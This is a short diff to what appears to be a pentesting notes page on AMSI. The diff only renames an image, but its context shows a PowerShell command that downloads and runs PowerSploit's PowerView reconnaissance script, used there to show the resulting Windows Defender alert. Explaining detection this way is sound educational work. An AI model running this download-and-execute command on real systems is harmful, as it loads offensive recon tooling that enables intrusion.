@@ -169,7 +169,7 @@ It allows antivirus solutions to inspect script behavior by exposing script cont
 
 Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.
 
-<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (4) (5).png" alt=""><figcaption></figcaption></figure>
 
 Notice how it prepends `amsi:` and then the path to the executable from which the script ran, in this case, powershell.exe
 
